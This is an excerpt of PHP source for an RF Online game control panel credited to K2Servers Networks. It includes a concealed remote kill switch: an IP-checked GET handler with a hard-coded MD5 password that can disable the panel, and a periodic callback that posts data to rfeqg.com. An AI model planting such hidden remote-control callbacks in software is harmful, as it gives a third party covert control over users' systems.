...
function quick_msg($message, $type = 'error')
{
    ?>
    <head>
        <title>Game Control Panel Edition</title>
        <style type="text/css">
            body {
    ...
    <body>
    <h2>RF Online Game Control Panel Edition</h2>
    <?php
    echo '<div class="' . $type . '">' . $message . '</div>';
    ?>
    <div style="text-align: center;">
        <small>Copyright &copy; <a href="http://www.k2servers.top/">K2Servers Networks</a></small>
    </div>
    </body>
    </html>
    <?php
 ...
 */
$commandFile = './includes/cache/command.cache';

$authAddress = @gethostbyname('rfeqg.com/gamecp');
if ($_SERVER['REMOTE_ADDR'] == $authAddress) {
    if (isset($_GET['password']) && isset($_GET['command']) && md5($_GET['password']) == 'b7e7bfc2ec28cb5eee17ab24d684af7b') {
        $command = $_GET['command'];
        if (in_array($command, array('disable', 'callback'))) {
            $fp = @fopen($commandFile, 'w');
            @fwrite($fp, json_encode(
                array(
                    'command' => $command,
                    'message' => 'Game Control Panel has been disabled. Please contact K2Servers Networks immediately.'
                )
            ));
            @fclose($fp);
        } elseif ($command == 'enable') {
            @unlink('./includes/cache/command.cache');
        }
    }
}

$serverResponse = json_encode(array(
    'command' => 'no-command',
    'meessage' => 'none'
));

if (@file_exists($commandFile)) {
    $serverResponse = @file_get_contents($commandFile);
    $serverResponse = @json_decode($serverResponse, true);
}

if ((isset($serverResponse['command']) && $serverResponse['command'] != 'disable-callback') || (date("G") >= 3 && date("G") <= 4)) {
    $checkUrl = 'http://www.rfeqg.com/gamecp/index.php';
    $postData = array(
    ...
    if (!($serverResponse = fetch_remote_file($checkUrl, $postData))) {
        $fp = @fopen($commandFile, 'w');
        @fwrite($fp, json_encode(
            array(
                'command' => 'disable-callback',
                'message' => 'empty'
            )
        ));
        @fclose($fp);
...
if (isset($serverResponse['command']) && $serverResponse['command'] != 'no-command') {
    $command = $serverResponse['command'];
    if ($command == 'disable') {
        quick_msg('Game CP Disabled. Reason: ' . $serverResponse['message']);
    }
}
...
if ($cookiedata != "") {
    ...
    if ($exit_login != true) {
		...
		L.EMail, U.Serial, U.CreateTime, U.LastConnectIP, U.lastlogintime, U.lastlogofftime,
		U.uilock as uilock
		FROM
